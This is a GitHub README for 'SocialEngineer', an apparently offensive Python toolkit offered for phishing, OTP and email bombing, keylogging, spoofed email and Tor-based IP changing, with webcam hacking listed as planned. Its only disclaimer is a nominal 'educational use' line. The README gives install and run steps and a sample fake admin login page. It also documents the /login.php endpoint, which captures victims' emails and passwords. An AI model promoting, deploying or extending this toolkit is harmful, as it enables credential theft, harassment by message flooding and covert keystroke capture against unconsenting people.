

# SOCIAL ENGINEER 🎯🕵️‍♂️

A powerful social engineering toolkit that automates phishing, OTP/email bombing, fake mail,IP changing and more — built with ❤️ by [@karthithehacker](https://karthithehacker.com)

![Main Menu](https://raw.githubusercontent.com/karthi-the-hacker/SocialEngineer/4982e91213338b6425de2379654786c8fa38cfc3/images/social-engineer.png)

> ⚠️ For educational use only. Do **not** use this tool against anyone without explicit permission.

> **Note:** This tool has been updated to a JavaScript codebase and published on npmjs for easier installation and additional features.  
> Please check the latest version: https://www.npmjs.com/package/socialengineering
---

## 📌 Features

* 🎯 **Phishing Attacks** – Simulate fake login pages to steal credentials
* 🔢 **OTP Bombing** – Flood OTP requests to a target number
* 🎹 **Keylogger** – Capture user keystrokes
* 📧 **Email Bombing** – Mass email sending to disrupt inboxes
* ✉️ **Send Fake Email** – Custom spoofed email sender
* 🕵️ **IP Changer** – Change IP automatically
* ❌ **Quit** – Exit the toolkit gracefully

---

## 💻 Tech Stack

* **Language**: Python 3
* **Libraries Used**:

  * `requests`
  * `rich`
  * `colorama`
  * `dnspython`
  * `stem `
  * `requests `
  * `pysocks`
  * `cloudflared` (install separately as a CLI binary)

Install the Python dependencies with:

```bash
pip install -r requirements.txt
sudo apt install tor -y
```

Cloudflared is not a Python package; download it from Cloudflare’s site or use a package
manager. For details see:

```
https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation
```

---

## 🗂️ Project Structure

```
Social-Engineer/
├── AttackModes/
│   ├── phishing.py
│   ├── keylogger.py
│   ├── otpboming.py
│   ├── spfattack.py
│   ├── emailboming.py
|   └── ipchanger.py
├── includes/
│   ├── banner.py
│   ├── config_status.py
│   ├── dynamic_url.py
│   ├── menu.py
│   └── utils.py
├── SocialEngineer.py
├── requirements.txt
└── README.md
```

---

## 🚀 Usage

### 🔧 Installation

1. Clone the repository:

```bash
git clone https://github.com/karthi-the-hacker/SocialEngineer.git
cd SocialEngineer

```

2. Install dependencies:

```bash
pip install -r requirements.txt
chmod +x install.sh
sudo ./insatll.sh
```

3. Run the tool:

```bash
sudo python3 SocialEngineer.py
```

### 📸 Sample Output

```text

                                                                                                    v2.0

███████╗ ██████╗  ██████╗██╗ █████╗ ██╗         ███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗███████╗██████╗ 
██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║         ██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝██╔════╝██╔══██╗
███████╗██║   ██║██║     ██║███████║██║         █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  █████╗  ██████╔╝
╚════██║██║   ██║██║     ██║██╔══██║██║         ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██╗
███████║╚██████╔╝╚██████╗██║██║  ██║███████╗    ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗███████╗██║  ██║
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝                                           
                                                                Author: @karthithehacker
                                                                Website: Karthithehacker.com                                                               
                                                     

            Main Menu             
┏━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ No. ┃ Option                   ┃
┡━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ 1   │ 🎯 Start Phishing Attack │
│ 2   │ 📲 OTP Bombing           │
│ 3   │ 🎹 Keylogger             │
│ 4   │ 📩 Email Bombing         │
│ 5   │ 📧 Send Fake Email       │
│ 6   │ 🕵️ IP Changer            │
│ 0   │ ❌ Quit                  │
└─────┴──────────────────────────┘
👉 Select an option: 
```

## 🤩 New Feature (IP Changer)


| Connect to              | Command / Steps                                                                                                                   | Description                                                           |
| ----------------------- | --------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| `Chromium`              | `chromium --proxy-server="socks5://127.0.0.1:9050"`                                                                               | **Launch Chromium with SOCKS5 proxy enabled.**                        |
| `Chrome`                | `chrome --proxy-server="socks5://127.0.0.1:9050"`                                                                                 | **Launch Google Chrome with SOCKS5 proxy.**                           |
| `Firefox`               | Settings → Preferences → Network Settings → Manual Proxy → SOCKS Host: `127.0.0.1`, Port: `9050`, SOCKS v5 → Enable **Proxy DNS** | **Configure Firefox via UI to use SOCKS5 proxy.**                     |
| `Linux (system-wide)`   | `export ALL_PROXY="socks5h://127.0.0.1:9050"`                                                                                     | **Set proxy for terminal apps (per session).**                        |
| `Linux (proxychains)`   | Add `socks5 127.0.0.1 9050` to `/etc/proxychains.conf` → Run: `proxychains4 <command>`                                            | **Force any app to use SOCKS5 proxy.**                                |
| `macOS (system-wide)`   | `sudo networksetup -setsocksfirewallproxy "Wi-Fi" 127.0.0.1 9050`                                                                 | **Apply SOCKS5 proxy to Wi-Fi network.**                              |
| `Windows (system-wide)` | Use **Proxifier** / **ProxyCap** → Add Proxy: `127.0.0.1:9050` (SOCKS5) → Apply Rules                                             | **Windows GUI doesn’t support SOCKS globally, requires helper tool.** |




## 📝 Notes

- You can keep adding new folder templates in `templates/` with the structure:
  ```
  templates/
  ├── yourtemplatename/
      ├── index.html
      └── index.css
  ```
- The server will load the correct template based on the user input or default config.
- Make sure your Python server is serving files from the selected template directory and captures data from `/login`.




## 🧪 Example Fake Login Template (HTML)

### `index.html`

```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>XYZ Admin Login</title>
      <link rel="stylesheet" href="index.css">
    </head>
    <body>
      <form action="/login.php" method="post" class="login-box">
        <h2>Login</h2>
        <input type="text" name="email" placeholder="Username or Email" required>
        <input type="hidden" name="type" value="xyz"></input>
        <input type="password" name="password" placeholder="Password" required>
        <input type="submit" value="Login">
        <div class="note">fake template</div>
      </form>
    </body>
    </html>
```


## 📡 Phishing Portal Endpoint

The `login.php` endpoint receives credentials from fake  login pages (templates). When a user submits the login form, the server captures the following parameters:

### 📥 POST `/login.php`

| Parameter  | Type     | Description            |
|------------|----------|------------------------|
| `email` | `string` | **Required.** Username or email entered by the user |
| `password` | `string` | **Required.** Password entered by the user |
| `type` | `string` | **Required.** Template name set by developer |


---

## 🔮 Planned Features

> Coming Soon:

* 📞 Fake IVR Call
* 🛠️  Settings / Configuration Menu
* 🎥 Webcam Hacking

---

## 👨‍💻 Author

* Website: [karthithehacker.com](https://karthithehacker.com)
* GitHub: [@karthi-the-hacker](https://github.com/karthi-the-hacker)

---

## ⚠️ Disclaimer

This tool is intended **strictly for educational and ethical use**.
Do not use it to attack targets without prior consent.
The developer takes **no responsibility** for any misuse or illegal activity.

